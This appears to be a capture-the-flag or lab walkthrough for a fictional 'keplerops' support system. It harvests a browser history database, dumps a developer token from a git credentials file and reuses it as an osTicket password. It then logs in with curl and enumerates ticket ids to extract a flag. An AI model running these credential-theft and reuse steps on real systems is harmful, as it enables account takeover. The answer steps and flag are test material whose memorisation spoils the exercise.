# K01.2 Walkthrough: Recover the retained support ticket

The retained ticket is a native osTicket case. Recover its reference from the
browser history. Then read its thread in the osTicket agent panel with Rowan's
staff login. No custom conversation endpoint is used.

## Step 0

```
gcloud compute ssh cinder-rs1-keplerops --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Recover the ticket reference from browser history

```
sqlite3 ~/.config/chromium/Default/History "select url, title from urls order by last_visit_time desc limit 5;"
```

Output includes: `https://support.keplerops.test/scp/tickets.php|SUP-2841 · ARWC connector callback latency · FieldKest Support`

Ticket reference: `SUP-2841`. The page is the osTicket agent ticket view.

## Recover Rowan's support login

```
cat ~/.config/git/credentials
```

Output: `https://rowan.ito:fk_developer_XZEfsIkBHyX-OwPvEKQlFWUVNasbir7q@source.keplerops.test`

Rowan's osTicket agent account reuses this developer token as its password.

## Log into the osTicket agent panel

```
CA=~/.local/share/keplerops/ca.crt
BASE=https://support.keplerops.test
DEV=fk_developer_XZEfsIkBHyX-OwPvEKQlFWUVNasbir7q
csrf=$(curl -sS --cacert "$CA" -c /tmp/ost.jar "$BASE/scp/login.php" \
  | grep -oP 'name="__CSRFToken__"[^>]*value="\K[^"]+' | head -1)
curl -sS --cacert "$CA" -b /tmp/ost.jar -c /tmp/ost.jar -i -o /tmp/login.out \
  --data-urlencode "__CSRFToken__=$csrf" --data-urlencode "userid=rowan.ito" \
  --data-urlencode "passwd=$DEV" --data-urlencode "submit=Log In" "$BASE/scp/login.php"
grep -i '^location:' /tmp/login.out
```

Output: `location: index.php` (HTTP 302 to the agent dashboard confirms login).

## Verify an unauthenticated session is denied

```
curl -sS -o /dev/null -w "%{http_code}\n" --cacert "$CA" "$BASE/scp/tickets.php?id=1"
```

Output: `302` (osTicket redirects an unauthenticated agent request to the login page).

## Open SUP-2841 and read the thread (K01.2 acceptance check)

osTicket assigns a numeric id to each ticket. Resolve the id for `SUP-2841`,
then read its thread.

```
tid=""
for i in $(seq 1 25); do
  if curl -sS --cacert "$CA" -b /tmp/ost.jar "$BASE/scp/tickets.php?id=$i" | grep -q "ARWC connector callback latency"; then tid=$i; break; fi
done
curl -sS --cacert "$CA" -b /tmp/ost.jar "$BASE/scp/tickets.php?id=$tid" \
  | grep -oE 'Retention reference FLAG\{[0-9a-f]+\}'
```

Output: `Retention reference FLAG{408710d448134ab5}`

The native osTicket ticket identity `SUP-2841`, its ARWC customer, Maya's
assignment, and the retained thread correspondence establish the result.
